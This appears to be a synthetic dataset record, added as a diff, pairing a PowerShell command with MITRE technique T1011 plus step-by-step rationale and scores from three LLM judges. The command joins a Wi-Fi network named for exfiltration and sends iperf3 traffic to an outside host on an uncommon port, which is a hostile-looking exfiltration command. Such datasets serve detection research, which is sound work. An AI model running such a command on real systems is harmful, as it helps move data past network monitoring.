@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh wlan connect name=\"DIRECT-EXFIL-5G\" ssid=\"DIRECT-EXFIL-5G\" interface=\"Wi-Fi\" | Out-Null; $wf=Get-NetAdapter -InterfaceAlias 'Wi-Fi' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $wf.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c 10.19.7.1 -p 57999 -B $ip -t 45",
+  "explanation": "Connects to a non-corporate Wi‑Fi network and exfiltrates by binding iperf3 to the Wi‑Fi interface on an uncommon port, explicitly using Wi‑Fi as an alternate medium (T1011).",
+  "rationale_steps": [
+    "Join a dedicated Wi‑Fi network separate from the primary network.",
+    "Discover the Wi‑Fi interface's local IP.",
+    "Run iperf3 client bound to that IP using a high port.",
+    "Limit duration to reduce exposure."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-225e09bc-ce74f7d7",
+  "source_prompt_hash": "225e09bc",
+  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes, proper separators, and valid parameters for netsh, Get-Net* cmdlets, and iperf3.",
+        "semantic_score": 4,
+        "semantic_justification": "It connects to a Wi‑Fi network and binds traffic to that interface using iperf3, aligning with T1011, but assumes an existing WLAN profile and uses a throughput tool rather than exfiltrating actual data.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T00:48:51.280450Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is well-formed PowerShell with balanced quotes and valid separators, though piping netsh output to Out-Null is unconventional since netsh is a separate process and the pipe may not behave as intended in all PowerShell versions.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements T1011 by connecting to an alternate Wi-Fi network and using iperf3 bound to that interface's IP on an uncommon port for data exfiltration, though iperf3 is a bandwidth testing tool rather than a true exfiltration tool and requires a listening server at 10.19.7.1:57999, making it operationally plausible but slightly unrealistic as a practical exfiltration mechanism.",
+        "combined_score": 4.0,
+        "confidence": 0.82,
+        "timestamp": "2026-02-18T22:02:37.768189Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses correct PowerShell syntax, properly handles variable assignment, uses valid cmdlet parameters, and correctly chains commands with semicolons.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly demonstrates T1011 by forcing a connection to a specific Wi-Fi SSID and explicitly binding the exfiltration tool (iperf3) to that interface's IP address.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:02:40.517485Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
